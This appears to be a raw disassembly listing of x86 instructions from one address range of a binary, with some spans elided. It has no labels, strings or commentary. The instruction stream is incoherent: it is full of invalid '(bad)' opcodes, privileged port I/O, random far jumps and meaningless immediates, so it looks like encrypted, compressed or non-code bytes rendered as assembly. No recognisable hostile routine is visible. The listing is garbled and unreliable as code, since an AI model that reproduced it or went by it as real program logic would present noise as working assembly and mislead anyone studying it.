  417367:	sub    esp,0x572fd93c
  41736d:	push   edx
	...
  4173d6:	imul   edi,DWORD PTR [edi+edx*8-0x168028a2],0x8016bbf
  4173e1:	gs or  eax,0x67d348ca
  4173e7:	cli    
  4173e8:	add    BYTE PTR [eax],al
  4173ea:	add    BYTE PTR [ecx],al
  4173ec:	add    BYTE PTR [eax],al
  4173ee:	retf   
  4173ef:	into   
  4173f0:	loope  0x417433
  4173f2:	fucompp 
  4173f4:	mov    eax,ds:0x6d185a5b
  4173f9:	cmp    eax,0x598dc635
  4173fe:	icebp  
  4173ff:	fwait
  417400:	adc    eax,DWORD PTR [edi]
  417402:	xor    al,0x8d
  417404:	shr    BYTE PTR [ebx-0x44],1
  417407:	fs inc ebp
  417409:	aas    
  41740a:	outs   dx,BYTE PTR ds:[esi]
  41740b:	pop    ds
  41740c:	out    0x2e,eax
  41740e:	cmp    eax,esp
  417410:	dec    esi
  417411:	mov    bh,0x47
  417413:	dec    esp
  417414:	dec    ecx
  417415:	int    0x45
  417417:	sub    BYTE PTR [edi+0x61],ch
  41741a:	xor    DWORD PTR [ecx],ebp
  41741c:	ss pop ebp
  41741e:	gs scas eax,DWORD PTR es:[edi]
  417420:	jp     0x4173f1
  417422:	pop    ss
  417423:	push   edx
  417424:	mov    ecx,edx
  417426:	jle    0x41744b
  417428:	int3   
  417429:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41742a:	and    al,BYTE PTR [esi-0x4b]
  41742d:	mov    al,0x18
  41742f:	jp     0x417449
  417431:	pop    ss
  417432:	jno    0x41747c
  417434:	out    0x1c,eax
  417436:	mov    eax,ecx
  417438:	jns    0x4173ea
  41743a:	(bad)  
  41743b:	das    
  41743c:	sbb    BYTE PTR [ebx-0x4d6fbf54],dl
  417442:	cmp    al,0x77
  417444:	sbb    al,0x9
  417446:	lods   eax,DWORD PTR ds:[esi]
  417447:	outs   dx,DWORD PTR ds:[esi]
  417448:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417449:	int3   
  41744a:	push   0x419a4fc
  41744f:	xchg   ebp,eax
  417450:	fwait
  417451:	in     eax,0x6e
  417453:	sub    bl,BYTE PTR [edi-0x80]
  417456:	jg     0x4173f5
  417458:	push   ds
  417459:	xchg   edx,eax
  41745a:	mov    ds:0x8c395a45,al
  41745f:	add    ah,dh
  417461:	popa   
  417462:	dec    DWORD PTR [ebx+ebx*4+0x98e3b2f]
  417469:	pushf  
  41746a:	jmp    0xd66f:0x6eb54907
  417471:	dec    esp
  417472:	ja     0x4174da
  417474:	cmp    BYTE PTR fs:[edx-0x54],dh
  417478:	iret   
  417479:	sub    BYTE PTR [edx-0x3e],ah
  41747c:	dec    eax
  41747d:	mov    ah,0x36
  41747f:	nop
  417480:	out    0x54,eax
  417482:	or     eax,0x90e7e726
  417487:	inc    ebx
  417488:	sbb    eax,0x6cf18623
  41748d:	hlt    
  41748e:	pop    edi
  41748f:	dec    edx
  417490:	fcomp  st(1)
  417492:	test   BYTE PTR [eax],dl
  417494:	add    eax,edi
  417496:	(bad)  
  417497:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417498:	sbb    bh,BYTE PTR [eax+0xfbfa8fa]
  41749e:	pop    es
  41749f:	push   cs
  4174a0:	sub    eax,0x57b08698
  4174a5:	lock mov cl,ch
  4174a8:	and    bh,al
  4174aa:	ins    BYTE PTR es:[edi],dx
  4174ab:	bound  ebx,QWORD PTR [ebx-0x3a]
  4174ae:	push   0xffffff8e
  4174b0:	sbb    edi,DWORD PTR [eax]
  4174b2:	jns    0x4174bd
  4174b4:	mov    bh,0x8b
  4174b6:	shr    esi,1
  4174b8:	pusha  
  4174b9:	addr16 and ebx,ecx
  4174bc:	inc    esp
  4174bd:	xor    al,0x68
  4174bf:	mov    edi,0xeda1b5c7
  4174c4:	mov    ah,0xd1
  4174c6:	jg     0x417483
  4174c8:	and    ah,BYTE PTR [edx]
  4174ca:	ss loop 0x41753d
  4174cd:	loop   0x417486
  4174cf:	loope  0x417525
  4174d1:	call   0xdda38813
  4174d6:	pop    esp
  4174d7:	sbb    al,0xc5
  4174d9:	ret    
  4174da:	mov    ds:0xcaf663a5,al
  4174df:	imul   edx,DWORD PTR [edx],0x23
  4174e2:	mov    ch,bl
  4174e4:	xchg   edx,eax
  4174e5:	(bad)  
  4174e6:	aaa    
  4174e7:	ins    DWORD PTR es:[edi],dx
  4174e8:	enter  0xccf,0xd5
  4174ec:	sub    bh,dh
	...
  417556:	xchg   ecx,eax
  417557:	mov    edx,0xdc6b0c6a
  41755c:	idiv   DWORD PTR [edi+0x212a686b]
  417562:	xor    eax,0x672237b4
  417567:	sti    
  417568:	add    BYTE PTR [eax],al
  41756a:	add    BYTE PTR [ecx],al
  41756c:	add    BYTE PTR [eax],al
  41756e:	pop    edi
  41756f:	adc    al,0x37
  417571:	cmp    BYTE PTR [edx+0x78],dh
  417574:	test   BYTE PTR [eax+eax*4],0x52
  417578:	jb     0x417507
  41757a:	ja     0x417513
  41757c:	hlt    
  41757d:	push   0x795dee74
  417582:	push   ds
  417583:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417584:	in     eax,0xc4
  417586:	mov    ebx,0xd294eddb
  41758b:	lods   al,BYTE PTR ds:[esi]
  41758c:	mov    ch,0x3b
  41758e:	push   esi
  41758f:	jnp    0x417595
  417591:	loopne 0x417521
  417593:	sahf   
  417594:	out    0x85,al
  417596:	mov    dl,BYTE PTR [ecx-0x4707b1eb]
  41759c:	lahf   
  41759d:	rcr    DWORD PTR [edx],0x8a
  4175a0:	jle    0x41757f
  4175a2:	xchg   ebp,eax
  4175a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175a4:	xchg   ebx,eax
  4175a5:	js     0x417575
  4175a7:	dec    ebp
  4175a8:	add    BYTE PTR [ebx+0x7d],bl
  4175ab:	inc    esp
  4175ac:	cmp    BYTE PTR [ebx],bh
  4175ae:	pop    ss
  4175af:	test   ebx,esp
  4175b1:	sbb    BYTE PTR [ebx+0x325a1f22],bh
  4175b7:	lods   al,BYTE PTR ds:[esi]
  4175b8:	in     eax,dx
  4175b9:	enter  0x434,0x13
  4175bd:	call   0xe86c:0x6acf71e7
  4175c4:	int    0x1d
  4175c6:	dec    ebp
  4175c7:	mov    dl,bh
  4175c9:	adc    DWORD PTR [edi+0x6e],0xffffffea
  4175cd:	mov    esi,0x17e7bc00
  4175d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175d3:	inc    esp
  4175d4:	sti    
  4175d5:	shl    DWORD PTR [ecx-0x21],cl
  4175d8:	jp     0x41761b
  4175da:	xor    bl,bl
  4175dc:	icebp  
  4175dd:	mov    ds:0xddb527d8,al
  4175e2:	xchg   ebp,eax
  4175e3:	fist   DWORD PTR [ebx+0x1e0d977c]
  4175e9:	dec    esp
  4175ea:	mov    cl,bl
  4175ec:	and    al,0xc4
  4175ee:	adc    DWORD PTR [ebp+0x59fd8d8c],0xffffffc3
  4175f5:	dec    edx
  4175f6:	and    al,BYTE PTR [edx+0x14]
  4175f9:	add    eax,0x537db456
  4175fe:	pop    es
  4175ff:	in     eax,0x1e
  417601:	dec    ecx
  417602:	push   ebp
  417603:	cmp    ebp,0x2d
  417606:	and    edi,DWORD PTR [ebx+ebp*2]
  417609:	mov    DWORD PTR [edx-0x3de37655],edi
  41760f:	cmp    BYTE PTR [esi-0x1e9b9add],ah
  417615:	arpl   WORD PTR [eax],sp
  417617:	ins    DWORD PTR es:[edi],dx
  417618:	jae    0x417615
  41761a:	test   DWORD PTR [eax],edx
  41761c:	js     0x417666
  41761e:	sbb    edi,0x6e
  417621:	lahf   
  417622:	shr    BYTE PTR [eax-0x72],0x94
  417626:	cmp    al,0x88
  417628:	loop   0x4175e0
  41762a:	cli    
  41762b:	mov    bl,0x45
  41762d:	fnstenv [esi+0x2]
  417630:	mov    esi,0x4be05285
  417635:	sbb    edi,DWORD PTR [ecx]
  417637:	inc    ecx
  417638:	cmp    cl,cl
  41763a:	ja     0x417661
  41763c:	mov    bl,0xa5
  41763e:	and    DWORD PTR [ebp+0x71],edx
  417641:	ins    BYTE PTR es:[edi],dx
  417642:	fcmovb st,st(7)
  417644:	stos   DWORD PTR es:[edi],eax
  417645:	sti    
  417646:	fcmovnbe st,st(7)
  417648:	xchg   edi,eax
  417649:	test   BYTE PTR [edi],0xae
  41764c:	xor    al,0xfa
  41764e:	fidiv  DWORD PTR [eax+ecx*2-0x315b3f0c]
  417655:	inc    edi
  417656:	jb     0x417636
  417658:	jns    0x4175e3
  41765a:	inc    ecx
  41765b:	mov    ecx,eax
  41765d:	sar    BYTE PTR [edx],cl
  41765f:	xlat   BYTE PTR ds:[ebx]
  417660:	aad    0xeb
  417662:	lea    edi,[ecx]
  417664:	sbb    esp,ebx
  417666:	pop    edx
  417667:	in     al,0x2a
  417669:	cmp    cl,bl
  41766b:	fistp  QWORD PTR [eax+0x60]
	...
  4176d5:	add    BYTE PTR [ecx-0x20b02c99],ch
  4176db:	(bad)  
  4176dc:	mov    ebp,0x411f24e7
  4176e1:	ficom  DWORD PTR [esi]
  4176e3:	add    BYTE PTR [edx],ch
  4176e5:	mov    ebp,0xfc67
  4176ea:	add    BYTE PTR [ecx],al
  4176ec:	add    BYTE PTR [eax],al
  4176ee:	sbb    al,0xb8
  4176f0:	cmp    BYTE PTR [eax+edi*2],ah
  4176f3:	or     DWORD PTR [edx-0x68],ecx
  4176f6:	jne    0x41773f
  4176f8:	or     DWORD PTR [ecx+0x2e1f639d],0xcabfb766
  417702:	push   ds
  417703:	bound  edi,QWORD PTR [eax]
  417705:	xor    al,0xa8
  417707:	pushf  
  417708:	ret    0x4672
  41770b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41770c:	sbb    cl,al
  41770e:	or     ch,BYTE PTR [ecx+0x358b33c3]
  417714:	mov    al,0x28
  417716:	pusha  
  417717:	mov    ds:0xc482d5eb,eax
  41771c:	mov    ?,WORD PTR [eax+edx*2]
  41771f:	xchg   BYTE PTR [esi+0x6e8e181c],dl
  417725:	sub    dl,ah
  417727:	fldcw  WORD PTR [edx+0x1655dd87]
  41772d:	enter  0xb35c,0xa6
  417731:	mov    ebx,0xd7a7928c
  417736:	inc    edx
  417737:	cmp    bh,bh
  417739:	adc    al,0x44
  41773b:	ins    DWORD PTR es:[edi],dx
  41773c:	adc    BYTE PTR [esi+0x52eb47b0],0x6
  417743:	xor    bl,BYTE PTR [edi-0x3c4f34b7]
  417749:	(bad)  [edi+0x3b]
  41774c:	int    0x85
  41774e:	mov    BYTE PTR [edx-0x6c],bl
  417751:	xchg   DWORD PTR [edx-0x6ae92e7f],esp
  417757:	or     eax,esi
  417759:	add    al,0x1e
  41775b:	cmp    BYTE PTR [ebx+0x3],bl
  41775e:	daa    
  41775f:	(bad)  
  417760:	mov    edi,0x78c38bbf
  417765:	push   ss
  417766:	jo     0x4177ac
  417768:	dec    esi
  417769:	loope  0x417728
  41776b:	xor    esi,DWORD PTR [esi]
  41776d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41776e:	sbb    bl,BYTE PTR [edx-0x4c]
  417771:	arpl   WORD PTR [ecx-0x488e7aab],bp
  417777:	call   0xc5fe6914
  41777c:	(bad)  
  41777d:	push   ebp
  41777e:	test   BYTE PTR [esi+0x7d7eec88],ch
  417784:	cdq    
  417785:	and    ah,al
  417787:	loope  0x4177de
  417789:	push   DWORD PTR [ecx-0x6b38f3aa]
  41778f:	repnz xlat BYTE PTR ds:[ebx]
  417791:	sar    BYTE PTR [edi],1
  417793:	sub    esi,DWORD PTR [ecx]
  417795:	sbb    eax,DWORD PTR [edx]
  417797:	jbe    0x417814
  417799:	fcmovb st,st(2)
  41779b:	js     0x41779a
  41779d:	gs push ss
  41779f:	xor    eax,0xc3839b7b
  4177a4:	icebp  
  4177a5:	pop    esi
  4177a6:	pop    ss
  4177a7:	jno    0x41776e
  4177a9:	retf   0x4239
  4177ac:	adc    al,0xae
  4177ae:	and    BYTE PTR [ebx*4+0x900402e],dl
  4177b5:	sub    BYTE PTR [ebx-0x3d],dl
  4177b8:	mov    ds:0xd9195251,al
  4177bd:	pop    ebp
  4177be:	aam    0x57
  4177c0:	fwait
  4177c1:	mov    ds:0x1b44b306,al
  4177c6:	in     al,0xa
  4177c8:	into   
  4177c9:	mov    ds:0x27362d63,al
  4177ce:	sub    dh,BYTE PTR [eiz*4-0x55530a5e]
  4177d5:	ficom  DWORD PTR [eax]
  4177d7:	or     DWORD PTR [esi-0x7],0xd619a266
  4177de:	add    edx,DWORD PTR [edx+0x27]
  4177e1:	(bad)  
  4177e2:	xchg   edx,eax
  4177e3:	idiv   BYTE PTR [ebx-0x32]
  4177e6:	scas   eax,DWORD PTR es:[edi]
  4177e7:	fidivr DWORD PTR [ebx+0x25]
  4177ea:	repz ds aas 
  4177ed:	xchg   edi,eax
	...
  417856:	jmp    0xff597669
  41785b:	imul   ecx
  41785d:	(bad)  
  41785e:	lahf   
  41785f:	repnz and dl,dl
  417862:	mov    ch,0x5d
  417864:	loop   0x417895
  417866:	addr16 std 
  417868:	add    BYTE PTR [eax],al
  41786a:	add    BYTE PTR [ecx],al
  41786c:	add    BYTE PTR [eax],al
  41786e:	xchg   edx,eax
  41786f:	cmp    cl,dh
  417871:	xchg   BYTE PTR [esi-0x3f],dl
  417874:	clc    
  417875:	outs   dx,DWORD PTR ds:[esi]
  417876:	inc    ebx
  417877:	push   eax
  417878:	or     al,0x89
  41787a:	xchg   ebp,eax
  41787b:	into   
  41787c:	xchg   ebp,eax
  41787d:	stc    
  41787e:	out    dx,al
  41787f:	(bad)  
  417880:	div    eax
  417882:	test   DWORD PTR [edi-0x72bb4363],edi
  417888:	cli    
  417889:	push   ds
  41788a:	popa   
  41788b:	retf   0xc236
  41788e:	dec    edi
  41788f:	out    0x64,al
  417891:	push   ebp
  417892:	arpl   WORD PTR [ebx+0x369396ca],dx
  417898:	(bad)  
  417899:	pop    eax
  41789a:	mov    esi,0xc4578ddb
  41789f:	sbb    BYTE PTR [edx-0x61068d10],0x90
  4178a6:	xor    edi,DWORD PTR [ecx]
  4178a8:	ins    DWORD PTR es:[edi],dx
  4178a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178aa:	xor    DWORD PTR [edi-0x1b],esi
  4178ad:	cmp    bl,BYTE PTR [ebx+0x50e7a186]
  4178b3:	lock addr16 jp 0x417878
  4178b7:	or     eax,0x8ab7b211
  4178bc:	leave  
  4178bd:	jg     0x4178fa
  4178bf:	sahf   
  4178c0:	fstp   st(1)
  4178c2:	mov    bh,0x50
  4178c4:	inc    esi
  4178c5:	shr    ebp,1
  4178c7:	and    BYTE PTR [esi-0x48a7480],cl
  4178cd:	fnstcw WORD PTR [edx+0x7f]
  4178d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178d1:	and    dh,BYTE PTR [edi-0x65c41d77]
  4178d7:	and    eax,0x31ee262e
  4178dc:	and    dl,ch
  4178de:	rcl    cl,cl
  4178e0:	imul   ebp,DWORD PTR [esi+0x2f31bddb],0xfffffffb
  4178e7:	jmp    0xcb3d:0x2042a3
  4178ee:	into   
  4178ef:	pop    ss
  4178f0:	jbe    0x4178ab
  4178f2:	outs   dx,BYTE PTR ds:[esi]
  4178f3:	push   esp
  4178f4:	idiv   edi
  4178f6:	and    edi,DWORD PTR ds:0x3978fa64
  4178fc:	jae    0x4178ef
  4178fe:	xor    DWORD PTR ds:0x4b5533e4,ecx
  417904:	adc    BYTE PTR [eax-0x49],0x8f
  417908:	pushf  
  417909:	jns    0x4178c9
  41790b:	cmp    BYTE PTR [edx+0x6b05cb1],ch
  417911:	std    
  417912:	pop    es
  417913:	ret    
  417914:	xor    eax,0xb24ae456
  417919:	idiv   BYTE PTR [edx-0x60]
  41791c:	inc    esi
  41791d:	adc    eax,0x19ad2c97
  417922:	clc    
  417923:	inc    ebx
  417924:	push   ds
  417925:	dec    eax
  417926:	adc    esp,DWORD PTR [ecx+0x3254b07b]
  41792c:	or     bl,ah
  41792e:	fs push eax
  417930:	imul   eax,DWORD PTR [ebp+0x52c44514],0x50
  417937:	jmp    0x4178dd
  417939:	js     0x41793f
  41793b:	cdq    
  41793c:	jns    0x4178e7
  41793e:	inc    ecx
  41793f:	call   0x1628:0xc4af3a3b
  417946:	and    al,0xa9
  417948:	jmp    0x4178f3
  41794a:	cmp    ebx,DWORD PTR [eax+0x4e]
  41794d:	(bad)  
  41794f:	add    BYTE PTR [esi+edi*2+0x52],cl
  417953:	jnp    0x417997
  417955:	push   esp
  417956:	mov    bh,BYTE PTR ds:0xae235468
  41795c:	jp     0x4179cb
  41795e:	mov    al,ds:0xbbf08df0
  417963:	in     eax,dx
  417964:	mov    eax,0xf7e6e507
  417969:	adc    al,BYTE PTR [edi-0xf]
  41796c:	aas    
  41796d:	ja     0x41796f
	...
  4179d3:	add    BYTE PTR [eax],al
  4179d5:	add    BYTE PTR [eax+0x41],bl
  4179d8:	pop    ds
  4179d9:	lods   eax,DWORD PTR ds:[esi]
  4179da:	pop    ds
  4179db:	(bad)  
  4179dc:	cli    
  4179dd:	cmc    
  4179de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179df:	retf   0xe5d4
  4179e2:	dec    ecx
  4179e3:	inc    ebx
  4179e4:	and    edx,ebp
  4179e6:	inc    BYTE PTR [bx+si]
  4179e9:	add    BYTE PTR [eax],al
  4179eb:	add    DWORD PTR [eax],eax
  4179ed:	add    BYTE PTR [ebx-0x30a6454e],ah
  4179f3:	in     al,0x6c
  4179f5:	imul   edi,DWORD PTR [edi+eiz*4],0x904c46a7
  4179fc:	jne    0x417a73
  4179fe:	(bad)  
  417a00:	xchg   esi,eax
  417a01:	shl    edx,1
  417a03:	dec    ebx
  417a04:	push   0xffffffab
  417a06:	or     dl,BYTE PTR [edx-0x6462b1bd]
  417a0c:	sub    al,BYTE PTR [edx]
  417a0e:	adc    BYTE PTR [eax+0x23bad02c],bh
  417a14:	xchg   edx,eax
  417a15:	jp     0x4179c5
  417a17:	mov    ds:0x7beac1b3,eax
  417a1c:	pop    ebx
  417a1d:	in     eax,0xd1
  417a1f:	xchg   ecx,eax
  417a20:	sbb    al,0x75
  417a22:	jnp    0x417a8d
  417a24:	iret   
  417a25:	aaa    
  417a26:	push   ss
  417a27:	cmove  esi,DWORD PTR [ebp+0x1401e68b]
  417a2e:	loopne 0x4179d7
  417a30:	jl     0x417aa5
  417a32:	mov    ebp,ebp
  417a34:	adc    BYTE PTR [ebx+0x1c],al
  417a37:	out    dx,eax
  417a38:	cld    
  417a39:	pop    ss
  417a3a:	mov    esp,ebp
  417a3c:	les    edi,FWORD PTR [eax+esi*4-0x4a7fc273]
  417a43:	nop
  417a44:	cmc    
  417a45:	mov    bl,0x69
  417a47:	pop    esp
  417a48:	sbb    cl,BYTE PTR [edx]
  417a4a:	hlt    
  417a4b:	pushf  
  417a4c:	(bad)  
  417a4d:	loop   0x417a69
  417a4f:	jmp    0x417a4b
  417a51:	fadd   DWORD PTR [edi]
  417a53:	cli    
  417a54:	push   es
  417a55:	mov    esp,0xa4b6fcd5
  417a5a:	add    al,0x7c
  417a5c:	cmp    eax,0x830b6520
  417a61:	push   esp
  417a62:	mov    eax,ds:0xa5090402
  417a67:	sbb    DWORD PTR [ebp+0x7ae90ec1],ebx
  417a6d:	popa   
  417a6e:	popf   
  417a6f:	adc    eax,0x1f79936e
  417a74:	test   eax,0x8ae5104a
  417a79:	(bad)  
  417a7a:	pusha  
  417a7b:	mov    BYTE PTR [esi+0x42579d1c],0xca
  417a82:	les    edx,FWORD PTR [esi+0x18f62f22]
  417a88:	fdiv   QWORD PTR [edi-0x37]
  417a8b:	adc    ebp,ecx
  417a8d:	sub    dl,dl
  417a8f:	jp     0x417a53
  417a91:	leave  
  417a92:	sbb    dl,BYTE PTR ds:0xea719910
  417a98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a99:	adc    al,0x2e
  417a9b:	fldcw  WORD PTR [ecx+ebx*4+0x25378cb1]
  417aa2:	or     ch,bh
  417aa4:	push   DWORD PTR [ebp+0x26919baa]
  417aaa:	mov    edx,DWORD PTR [edi-0x4a]
  417aad:	aad    0x85
  417aaf:	mov    ss,WORD PTR [ecx]
  417ab1:	push   esi
  417ab2:	sub    BYTE PTR [esi+0x54],cl
  417ab5:	xchg   edx,eax
  417ab6:	rol    ch,cl
  417ab8:	fidiv  DWORD PTR [esi+0x47]
  417abb:	mov    BYTE PTR [ecx],dl
  417abd:	jbe    0x417a4b
  417abf:	adc    esp,eax
  417ac1:	mov    esp,0x7f3dc441
  417ac6:	outs   dx,DWORD PTR ds:[esi]
  417ac7:	mov    ch,0xf6
  417ac9:	push   ebp
  417aca:	lods   eax,DWORD PTR ds:[esi]
  417acb:	das    
  417acc:	scas   eax,DWORD PTR es:[edi]
  417acd:	das    
  417ace:	inc    edx
  417acf:	clc    
  417ad0:	ins    DWORD PTR es:[edi],dx
  417ad1:	xlat   BYTE PTR ds:[ebx]
  417ad2:	push   0x617f757d
  417ad7:	and    al,0xb4
  417ad9:	pop    ebx
  417ada:	xor    eax,0xed82517e
  417adf:	add    eax,0xdf628995
  417ae4:	lsl    ecx,WORD PTR [eax+ebp*8]
  417ae8:	pop    ss
  417ae9:	pop    edi
  417aea:	and    DWORD PTR [ecx+0x81b3],0x0
	...
  417b55:	add    BYTE PTR [edi],ch
  417b57:	stos   DWORD PTR es:[edi],eax
  417b58:	cdq    
  417b59:	inc    ecx
  417b5a:	popf   
  417b5b:	jae    0x417b5c
  417b5d:	out    dx,eax
  417b5e:	(bad)  [eax]
  417b60:	xor    ebx,DWORD PTR [ecx+0x7146998c]
  417b66:	inc    DWORD PTR [bx+si]
  417b69:	add    BYTE PTR [eax],al
  417b6b:	add    DWORD PTR [eax],eax
  417b6d:	add    BYTE PTR [edx],cl
  417b6f:	adc    al,0x46
  417b71:	sbb    BYTE PTR [eax-0x1b5e8014],cl
  417b77:	mov    esi,0x9a949beb
  417b7c:	out    0x51,eax
  417b7e:	sbb    al,0x99
  417b80:	mov    edx,0x9ea85efe
  417b85:	in     eax,dx
  417b86:	or     BYTE PTR [eax],bh
  417b88:	add    edx,DWORD PTR [edi+0x7e]
  417b8b:	inc    ecx
  417b8c:	popa   
  417b8d:	inc    edi
  417b8e:	jmp    0xf518:0x2f1d5059
  417b95:	dec    edx
  417b96:	and    BYTE PTR [eax+0x22],0xd5
  417b9a:	test   eax,0x1b5ac5d6
  417b9f:	sub    BYTE PTR [edi-0x7aa524a3],bl
  417ba5:	add    dl,BYTE PTR [esi-0x40adc05d]
  417bab:	cmp    DWORD PTR [edx],ebx
  417bad:	jge    0x417c21
  417baf:	imul   edx,DWORD PTR [edi+0x67fd4dfe],0x1d
  417bb6:	stos   BYTE PTR es:[edi],al
  417bb7:	ret    
  417bb8:	out    0x34,eax
  417bba:	jg     0x417b96
  417bbc:	dec    eax
  417bbd:	sti    
  417bbe:	inc    eax
  417bbf:	rcl    BYTE PTR [ebx-0x4025ab94],0x3d
  417bc6:	fwait
  417bc7:	(bad)
  417bca:	ins    DWORD PTR es:[edi],dx
  417bcb:	push   ebx
  417bcc:	in     al,dx
  417bcd:	mov    BYTE PTR [eax],ch
  417bcf:	nop
  417bd0:	call   0x911:0x8fc6940d
  417bd7:	clc    
  417bd8:	test   ah,0x5b
  417bdb:	test   BYTE PTR [ecx],0x30
  417bde:	aad    0xef
  417be0:	(bad)  
  417be2:	nop
  417be3:	cwde   
  417be4:	div    DWORD PTR [edi]
  417be6:	mov    bl,0xf1
  417be8:	xchg   esp,eax
  417be9:	(bad)  
  417bea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417beb:	outs   dx,DWORD PTR ds:[esi]
  417bec:	aam    0x8
  417bee:	push   ds
  417bef:	in     eax,0xbd
  417bf1:	add    al,0x8
  417bf3:	xchg   esp,eax
  417bf4:	add    BYTE PTR [edx+0x31d9bb03],bh
  417bfa:	lds    ecx,FWORD PTR [ecx+0x1fef645b]
  417c00:	out    dx,al
  417c01:	push   ss
  417c02:	in     eax,dx
  417c03:	xor    ecx,esi
  417c05:	pop    es
  417c06:	cs ret 
  417c08:	push   es
  417c09:	sbb    BYTE PTR [edx+0x73],0xca
  417c0d:	call   0x5523ae54
  417c12:	or     eax,0xd23c1635
  417c17:	inc    ecx
  417c18:	mov    eax,ds:0x82c32f09
  417c1d:	lods   eax,DWORD PTR ds:[esi]
  417c1e:	(bad)  
  417c1f:	sahf   
  417c20:	cmp    DWORD PTR [eax],esi
  417c22:	fisub  DWORD PTR [eax+0x750ba952]
  417c28:	sub    eax,0x7658b44f
  417c2d:	bound  esp,QWORD PTR [eax+0x22f04a39]
  417c33:	(bad)  
  417c34:	test   al,0x90
  417c36:	and    cl,BYTE PTR [eax+0x23]
  417c39:	gs inc ch
  417c3c:	stc    
  417c3d:	adc    cl,cl
  417c3f:	add    BYTE PTR [ebx+ebp*2-0x3ad82b22],dl
  417c46:	hlt    
  417c47:	xlat   BYTE PTR ds:[ebx]
  417c48:	pop    edx
  417c49:	cmc    
  417c4a:	arpl   WORD PTR [ebp+0x681ba8a4],ax
  417c50:	popa   
  417c51:	in     eax,0xb5
  417c53:	mov    esp,0xa1244400
  417c58:	not    BYTE PTR [eax-0x5b29cd1e]
  417c5e:	movlps xmm3,QWORD PTR [ecx-0x26]
  417c62:	mov    dl,BYTE PTR [esi-0x18]
  417c65:	mov    bh,0x33
  417c67:	jecxz  0x417cd6
  417c69:	mov    ch,0xb6
  417c6b:	retf   
  417c6c:	int    0x28
	...
  417cd6:	mov    eax,eax
  417cd8:	nop
  417cd9:	test   cl,bl
  417cdb:	aam    0x9d
  417cdd:	int    0x75
  417cdf:	aaa    
  417ce0:	das    
  417ce1:	aam    0x4
  417ce3:	sbb    edx,ebp
  417ce5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ce6:	add    BYTE PTR [bx+di],al
  417ce9:	add    BYTE PTR [eax],al
  417ceb:	add    DWORD PTR [eax],eax
  417ced:	add    BYTE PTR [ecx],bh
  417cef:	add    bh,0x80
  417cf2:	xor    esi,esp
  417cf4:	xor    DWORD PTR [ebp-0x4604b986],ecx
  417cfa:	inc    eax
  417cfb:	inc    edx
  417cfc:	inc    esi
  417cfd:	add    ch,BYTE PTR [ebp-0x2d57559f]
  417d03:	addr16 pop edi
  417d05:	mov    BYTE PTR [ebx],dh
  417d07:	lods   eax,DWORD PTR ds:[esi]
  417d08:	pop    esp
  417d09:	adc    al,0x99
  417d0b:	jle    0x417d25
  417d0d:	adc    al,0x66
  417d0f:	mov    esp,0x7816b789
  417d14:	mov    bh,0xb3
  417d16:	pop    ss
  417d17:	inc    BYTE PTR [esi+0x70917c24]
  417d1d:	push   ecx
  417d1e:	mov    dl,0xe3
  417d20:	mov    WORD PTR [edi-0x7f3d3867],cs
  417d26:	into   
  417d27:	fst    DWORD PTR [ecx]
  417d29:	mov    cl,0xa5
  417d2b:	rcl    BYTE PTR ds:0xfebc6367,cl
  417d31:	xchg   BYTE PTR [ebx],dl
  417d33:	pop    edi
  417d34:	push   edx
  417d35:	and    edx,esp
  417d37:	in     eax,dx
  417d38:	jns    0x417d15
  417d3a:	adc    al,0xe5
  417d3c:	(bad)  
  417d3d:	mov    ch,0x8e
  417d3f:	jge    0x417d69
  417d41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d42:	fisubr WORD PTR [ebx-0x5904dd35]
  417d48:	call   DWORD PTR [edx+0x7dcff58c]
  417d4e:	mov    WORD PTR [edi-0x722676a8],ds
  417d54:	cmp    eax,0x88e540bd
  417d59:	push   cs
  417d5a:	adc    BYTE PTR [eax-0x76f1d4f1],bl
  417d60:	xlat   BYTE PTR ds:[ebx]
  417d61:	int3   
  417d62:	loop   0x417d80
  417d64:	in     al,dx
  417d65:	xor    bl,BYTE PTR [ebx+ebx*8+0x1db96520]
  417d6c:	sahf   
  417d6d:	or     BYTE PTR [ecx],dl
  417d6f:	mov    edi,0x32b840b0
  417d74:	hlt    
  417d75:	loope  0x417d1e
  417d77:	adc    edi,DWORD PTR [ebp+0x48758a4d]
  417d7d:	aad    0x48
  417d7f:	xor    al,0xcf
  417d81:	sti    
  417d82:	xchg   ebx,eax
  417d83:	aaa    
  417d84:	and    eax,0x6e83884e
  417d89:	test   al,0xae
  417d8b:	and    BYTE PTR [edi+0x31],bh
  417d8e:	(bad)  
  417d8f:	and    eax,0x474491cf
  417d94:	jbe    0x417dfc
  417d96:	dec    ecx
  417d97:	call   0xd721:0x1ad3f134
  417d9e:	outs   dx,BYTE PTR ds:[esi]
  417d9f:	in     eax,dx
  417da0:	xchg   ebx,eax
  417da1:	push   ds
  417da2:	or     DWORD PTR [ebp+ebp*1-0xee88b5c],ecx
  417da9:	jecxz  0x417d98
  417dab:	pmovmskb edx,mm1
  417dae:	lods   eax,DWORD PTR ds:[esi]
  417daf:	push   esp
  417db0:	cmp    al,0x24
  417db2:	in     al,dx
  417db3:	stos   BYTE PTR es:[edi],al
  417db4:	push   es
  417db5:	fs in  al,0x24
  417db8:	daa    
  417db9:	jno    0x417df5
  417dbb:	shr    BYTE PTR [ebx],cl
  417dbd:	mov    ecx,edx
  417dbf:	outs   dx,DWORD PTR ds:[esi]
  417dc0:	jb     0x417d46
  417dc2:	fldcw  WORD PTR [eax+0x2ccccfc9]
  417dc8:	pop    edi
  417dc9:	or     al,0xea
  417dcb:	fcomp  st(7)
  417dcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417dce:	loopne 0x417d54
